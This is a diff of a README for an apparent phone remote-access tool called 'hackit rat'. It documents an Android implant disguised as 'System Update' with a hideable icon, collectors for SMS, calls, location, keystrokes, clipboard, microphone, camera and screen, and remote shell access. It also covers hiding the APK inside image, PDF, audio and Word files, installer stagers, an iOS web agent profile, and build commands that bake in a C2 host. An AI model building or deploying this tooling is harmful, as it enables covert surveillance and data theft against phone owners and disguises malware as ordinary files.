@@ -1,108 +1,150 @@
-# hackit rat — Android implant + encrypted C2
+# hackit rat — multi-vector phone implant, C2 and operator bench
 
-Resident Android agent with a sealed command channel, a Python C2 and an
-operator console. Build output is a signed APK; runtime support runs from
-API 21 (Android 5.0) to API 35 (Android 15).
-
-## Shape
+One bench, five delivery paths: **APK**, **carrier files**, **web agent (iOS +
+Android)**, **native channel (C++/NDK)** and **installer stagers**. Every path
+lands in the same SQLite store and the same operator UI.
 
 ```
-implant (APK)  ──HTTPS POST /v1/beacon──▶  C2 (aiohttp)
-   │  sealed envelope: AES-256-GCM + HMAC-SHA256, HKDF from a 32-byte PSK
-   │  poll → tasks, results → next beacon
-   ├─ collectors: sms, calls, contacts, location, notifications, keylog,
-   │              clipboard, files, mic, camera, screen, apps, wifi, accounts
-   └─ persistence: foreground service, boot receiver, alarm + job, device admin
+                    ┌─────────────── C2 (aiohttp) ───────────────┐
+APK  ──HTTPS sealed──▶  /v1/beacon   tasks ⇄ results            │
+.so  ──UDP sealed───▶  native port   (ChaCha20-Poly1305)        │──▶ SQLite
+Web  ──JSON HTTPS──▶  /v1/web/<token>  PWA agent (iOS)          │──▶ live UI
+Files├─carriers─────▶  install.sh / carve.py → same APK         │
+Stager┄public URL──▶  /dl/<token>/ landing + apk + profile      ┘
 ```
 
-Everything that crosses the wire is encrypted; no op name, task or artifact is
-readable in transit. The PSK never leaves the build config and the C2 host.
-
-## Quick start
+## Menu (no flags)
 
 ```bash
-hackit rat doctor                                     # JDK 17 + SDK + build-tools
-hackit rat keygen --host https://c2.example.com       # PSK + agent.json
-hackit rat build --config ~/.hackit/rat/agent.json    # signed APK
-hackit rat console                                    # C2 + operator shell
+hackit rat
 ```
 
-`firewall + reverse proxy` (nginx/caddy) in front of the C2 is the expected
-deployment; keep `/v1/*` open and `/api/*` behind the operator token.
+Banner, help, then a plain input loop:
 
-Install on the device, open the app once (it is labelled "System Update"),
-grant permissions, then enable accessibility and the notification listener
-from the setup page. The launcher entry can then be switched off with:
+| input | effect |
+|---|---|
+| `make apk [name]` | bake host/PSK into a signed APK |
+| `make file <ext> [carrier]` | hide the APK in jpg/jpeg/png/webp/mp3/mp4/pdf/svg/docx |
+| `make stager [host]` | stager.sh, install.ps1, landing page, iOS profile |
+| `make ios [url]` | `.mobileconfig` WebClip + PWA URL |
+| `tunnel [provider]` | public URL via cloudflared / ngrok / ssh |
+| `run` | full-screen operator UI |
+| `sessions` / `doctor` / `help` / `quit` | support verbs |
+
+Scripted equivalents stay available: `hackit rat doctor|keygen|build|serve|
+console|run|send|sessions|dump|mint|tunnel`.
+
+## Operator UI (`run`)
+
+`hackit rat run` binds the C2 and draws a live screen: sessions with kind
+badge, battery and IP on the left; event feed and keylogger tail on the right;
+last location, active tasks and a command line underneath. Keys:
+
+`1-9` select · `j/k` move · `s` screenshot · `m` mic 15 s · `c` photo ·
+`i` info · `l` locate · `g` keylog · `a` apps · `f <dir>` · `p <path>` ·
+`x <cmd>` · `r` refresh · `q` quit.
+
+Without a TTY it degrades to a line feed, so it is still scriptable.
+
+## Delivery paths
+
+### 1. APK
+
+Java 8 implant, `minSdk 21` (Android 5.0) → `targetSdk 35` (Android 15).
+Foreground service labelled *System Update*, boot + alarm + job restart,
+optional device admin, launcher alias that can be switched off.
+
+Collectors: SMS (live observer), calls, contacts, location (fix + continuous),
+notifications, accessibility keylogger, clipboard, files (ls/pull/push with
+8 MB chunking), microphone (AAC), camera (JPEG with orientation fix), screen
+(MediaProjection), installed apps, Wi-Fi, accounts, device inventory, shell
+(30 s / 512 KB cap).
+
+### 2. Carrier files
+
+The APK is appended after the real container data (or packed as an OPC part
+for docx, base64 metadata for svg). A 25-byte trailer (`HACKITRATZIP1` + 8-byte
+length + tail) locates the payload, so `carve.py`, `install.sh` and
+`install.bat` extract it without scanning.
+
+Verified with real files: JPEG/PNG/WebP decode in Pillow, MP3/MP4 demux in
+ffprobe, PDF text extraction in pdftotext, DOCX zip integrity, SVG parses as XML.
+
+### 3. Web agent (iOS and Android)
+
+`hackit rat make ios` writes an unsigned `.mobileconfig` WebClip; open
+`/w/<token>/` once and the PWA installs. The agent reports device/build
+strings, screen, timezone, network, battery (Safari), geolocation, camera,
+5 s microphone clip and clipboard (gesture), every 30 s and on demand.
+Artifacts arrive base64 and are decoded into the loot folder. It cannot read
+SMS or files — that is the browser boundary, not a bug.
+
+### 4. Native channel (C++)
+
+`hackit/rat/native/` builds `libhackit.so` for arm64-v8a, armeabi-v7a and
+x86_64 with the NDK (CMake). It carries high-rate events over UDP with its own
+ChaCha20-Poly1305 (RFC 8439, no OpenSSL), bounded queue, exponential reconnect
+and probes read straight from `/proc`: injection markers, TracerPid/seccomp,
+sockets, mounts, CPU/memory, process list, plus an inotify watcher.
+
+JNI calls from the implant: `nativeInit`, `nativeSend`, `nativeState`,
+`nativeProbe`, `nativeWatch`, `nativeWatchDrain`, `nativeStop`. If the library
+is missing or blocked, the HTTP path is untouched.
+
+The same probes compile as a host binary: `stalker status|snapshot|net|maps|
+mounts|cpu|proc|watch <dir>|selftest`.
+
+### 5. Stagers and tunnels
+
+`make stager` emits an installer script, a PowerShell variant, a landing page
+and the iOS profile, all pointing at `/dl/<token>/agent.apk`. `make tunnel`
+publishes the C2 through cloudflared/ngrok/ssh so the same URL works from a
+different network.
+
+## Ports
+
+| port | use |
+|---|---|
+| `<http>` | HTTPS beacon, dashboard, `/v1/web`, `/w`, `/dl` |
+| `<http> + 100` | native UDP (ChaCha20-Poly1305, sealed) |
+| 1080 | SOCKS5 proxy (`--socks`) for operator traffic |
+
+## Build
 
 ```bash
-hackit rat send <sid> hide_icon on
+hackit rat doctor        # JDK 17+, SDK 35, build-tools 35, NDK, cmake
+hackit rat keygen --host https://c2.example.com
+hackit rat build         # apk + libhackit.so x3 ABIs
 ```
 
-## Commands
-
-| verb | args | effect |
-|---|---|---|
-| `info` | — | build, network, storage, security posture |
-| `perm_status` | — | every permission the implant cares about |
-| `sms_dump` / `sms_send` | `[n]` / `to body` | read, send SMS |
-| `calls_dump` / `contacts_dump` | `[n]` | call log, contacts |
-| `loc` / `loc_track` | — / `off` | one fix, continuous tracking |
-| `files_ls` / `files_pull` / `files_push` | `path` | browse and move files |
-| `clipboard_get` / `clipboard_set` | — / `text` | clipboard |
-| `notif_dump` | — | notification listener state |
-| `apps` | — | installed package census |
-| `mic_rec` | `[seconds]` | AAC clip, uploaded |
-| `cam_shot` / `screenshot` | — | JPEG still, PNG screen |
-| `shell` | `command` | `/system/bin/sh`, 30 s, 512 KB cap |
-| `keylog_dump` / `keylog_clear` | — | accessibility buffer |
-| `wifi_dump` / `accounts` | — | association + scans, account names |
-| `toast` / `vibrate` / `open_url` | `text` / `ms` / `url` | visible nudges |
-| `hide_icon` | `on` / `off` | launcher alias |
-
-`screenshot` needs a MediaProjection consent — open the setup page once and
-tap *Screen capture consent*; consent is per-projection on Android 14+.
-
-## Version behaviour
-
-| area | 5–9 | 10–12 | 13–15 |
-|---|---|---|---|
-| permissions | install-time | runtime dialog | runtime dialog, notification prompt on 13+ |
-| foreground service | plain start | `dataSync` type required on 14+ | types only while-in-use unless background location granted |
-| clipboard | readable in background | foreground/IME only | same as 10 |
-| screenshot | MediaProjection | MediaProjection | consent per capture, FGS `mediaProjection` type |
-| boot start | works | works | works, battery optimisation exemption advised |
-| SMS | read via permission | same | same (default-SMS role not required) |
-
-The service asks for `location` only when background location is granted (or
-the app is focused), and adds `microphone`/`camera` only when focused — which
-is what Android 14+ demands and what keeps the start from throwing.
+Engine `sdk` is offline (aapt2 → javac → d8 → zipalign → apksigner). Engine
+`gradle` uses AGP + R8 when Gradle is installed. `doctor` names whatever is
+missing and the sdkmanager package that fixes it.
 
 ## Layout
 
 ```
 hackit/rat/
-  protocol.py     envelope, HKDF, command table (mirrored in Crypto.java)
-  store.py        SQLite: sessions, tasks, events, keylogs, locations, loot
-  server.py       beacon, upload, dashboard, operator API
-  builder.py      config bake + sdk/gradle build engines
-  console.py      operator REPL (in-process C2)
-  template/       Android project (Java 8, min 21, target 35)
+  menu.py       bare `hackit rat` loop (make apk/file/stager/ios, tunnel, run)
+  ui.py         full-screen operator UI
+  polyglot.py   carrier injection + carve + launchers
+  samples.py    embedded valid carriers for bare boxes
+  ios.py        WebClip profile, PWA manifest, service worker
+  webagent.py   browser agent page + JS
+  stager.py     installer scripts, landing page, delivery manifest
+  tunnel.py     cloudflared / ngrok / ssh reverse
+  builder.py    config bake + sdk/gradle engines + native build
+  server.py     beacon, upload, web agent, UDP, dashboard, operator API
+  native/       C++17 engine (AEAD, transport, probes, JNI, host stalker)
+  template/     Android project (Java 8, min 21, target 35)
+  tests/        pytest suite (crypto, store, carriers, ios, udp, web)
 ```
 
-## Build engines
+## Notes
 
-* `sdk` — aapt2 → javac → d8 → zipalign → apksigner, offline, no Gradle.
-* `gradle` — AGP + R8 shrinking when Gradle is installed.
-
-`doctor` reports exactly which piece is missing; `--engine` forces one.
-
-## Design notes
-
-* Tasks are handed out atomically (`state='delivered'`) so a duplicated beacon
-  never double-runs them; unanswered tasks requeue after 180 s.
-* Outbox queues are capped (2000 events, 256 results) — old items drop before
-  RAM does.
-* Every collector fails closed: a missing permission yields an empty result,
-  never a crash.
-* Order-0 notification channel, `IMPORTANCE_MIN`, no badge, no sound.
-* Jittered beacon (±30% default) with exponential backoff to 5 minutes.
+- Tasks are handed out atomically (`delivered`); stale tasks requeue after 180 s.
+- Outbox queues are capped (2000 events, 256 results).
+- Jitter ±30 % with backoff to 5 minutes; native probes every 5 minutes.
+- `screenshot` needs a one-time MediaProjection consent from the setup page.
+- MP3 carriers keep playing; size-estimating tools may show a longer duration
+  because bytes are appended after the last frame.
